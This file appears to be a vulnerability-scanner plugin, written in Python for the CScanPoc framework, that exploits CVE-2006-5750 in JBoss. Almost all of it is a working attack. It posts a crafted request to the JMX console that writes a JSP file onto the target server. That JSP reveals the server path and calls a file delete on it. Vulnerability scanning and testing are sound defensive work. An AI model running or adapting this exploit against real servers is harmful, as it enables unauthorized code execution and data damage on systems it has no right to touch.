# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'JBoss_0001'  # 平台漏洞编号，留空
    name = 'JBoss 目录遍历'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_TRAVERSAL  # 漏洞类型
    disclosure_date = '2006-11-27'  # 漏洞公布时间
    desc = '''
        JBoss Application Server (jbossas)中的DeploymentFileRepository类存在目录遍历漏洞，远程认证用户可以通过和控制台管理器相关的未明向量，读取或修改任意文件并可能执行任意代码。
    '''  # 漏洞描述
    ref = 'http://cve.scap.org.cn/CVE-2006-5750.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2006-5750'  # cve编号
    product = 'JBoss'  # 漏洞应用名称
    product_version = 'JBoss 3.2.4 through 4.0.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c75a3ea3-a86b-4c27-a608-857ef76623a3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_code = ('\n<%@ page import="java.util.*,java.io.*" %>\n<%@ page import="'
                           'java.io.*"%>\n<%\nString path=request.getRealPath("");\nout.prin'
                           'tln(path);\nFile d=new File(path);\nif(d.exists()){\n  d.delete()'
                           ';\n  }\n%>\n<% out.println("this_is_not_exist_9.1314923");%>')
            payload = ('action=invokeOp&name=jboss.admin%%3Aservice%%3DDeploymentFileRepositor'
                       'y&methodIndex=5&arg0=test.war&arg1=test&arg2=.jsp&arg3=%s&arg4=True')
            verify_data = payload % urllib.parse.quote(verify_code)
            verify_url = self.target + '/jmx-console/HtmlAdaptor'
            page_content = ''
            request = urllib.request.Request(verify_url, verify_data)
            response = urllib.request.urlopen(request)
            page_content = str(response.read())
            if 'this_is_not_exist_9.1314923' in page_content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
